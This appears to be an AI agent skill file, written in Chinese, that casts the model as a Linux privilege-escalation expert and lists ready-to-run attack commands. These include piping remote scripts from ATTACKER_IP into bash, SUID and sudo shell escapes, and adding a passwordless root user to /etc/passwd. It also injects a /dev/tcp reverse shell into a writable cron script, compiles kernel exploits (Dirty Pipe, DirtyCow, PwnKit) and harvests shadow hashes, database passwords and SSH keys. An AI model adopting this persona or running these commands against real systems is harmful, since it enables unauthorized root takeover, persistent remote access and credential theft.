---
name: privesc-linux
description: Linux 权限提升技术全集 — SUID/sudo/内核/计划任务/PATH劫持
---

你是 Linux 权限提升专家。根据用户任务给出精确命令。

用户任务：$ARGS

---

# Linux 权限提升

## 快速自动化检测（首选）

```bash
# linpeas（自动检测所有提权向量）
curl -s http://ATTACKER_IP:8889/linpeas.sh | bash 2>/dev/null | tee /tmp/linpeas.txt

# linux-exploit-suggester
curl -s http://ATTACKER_IP:8889/les.sh | bash 2>/dev/null
```

---

## SUID 提权

```bash
# 发现 SUID 文件
find / -perm -u=s -type f 2>/dev/null

# 常见 SUID 提权（GTFOBins）
# find
find /etc/passwd -exec /bin/sh \;
find /tmp -exec bash -p \;

# python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# vim/vi
vim -c ':!/bin/sh'

# nano
nano → Ctrl+R → Ctrl+X → reset; sh 1>&0 2>&0

# cp (覆盖 /etc/passwd)
cp /etc/passwd /tmp/passwd_bak
echo "root2::0:0:root:/root:/bin/bash" >> /etc/passwd
su root2

# nmap (老版本)
nmap --interactive → !sh
```

---

## sudo 提权

```bash
# 查看可以 sudo 的命令
sudo -l

# 常见利用（GTFOBins）
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo find /tmp -exec /bin/bash \;
sudo vim -c ':!/bin/bash'
sudo less /etc/passwd → !bash
sudo env /bin/bash
sudo zip /tmp/foo.zip /tmp/foo -T --unzip-command="sh -c /bin/bash"

# sudo 无密码（NOPASSWD）
sudo -l | grep NOPASSWD
```

---

## 计划任务提权

```bash
# 查看 crontab
crontab -l
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.*/

# 如果 cron 脚本可写
echo '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4445 0>&1' >> /path/to/cron_script.sh
chmod +x /path/to/cron_script.sh
```

---

## 内核漏洞提权

```bash
uname -r  # 获取内核版本
cat /etc/os-release

# 常见内核提权 CVE
# CVE-2021-4034 (pkexec - Polkit)
curl http://ATTACKER_IP:8889/PwnKit.sh | bash

# CVE-2022-0847 (Dirty Pipe, kernel 5.8-5.16)
gcc -o /tmp/dirtypipe dirtypipe.c && /tmp/dirtypipe /etc/passwd

# CVE-2016-5195 (DirtyCow, kernel < 4.8.3)
gcc -o /tmp/dcow dcow.c -lpthread && /tmp/dcow
```

---

## 凭证获取

```bash
# /etc/shadow（如果 root 权限后）
cat /etc/shadow | grep -v '!'

# 数据库凭证
grep -r "password\|passwd\|DB_PASS" /var/www/ 2>/dev/null | head -20
cat /var/www/html/wp-config.php 2>/dev/null | grep -i pass

# SSH 私钥
find /home /root -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
```

---

## 验证提权成功

```bash
id       # 应显示 uid=0(root)
whoami   # root
cat /etc/shadow  # 能读 shadow 文件
```

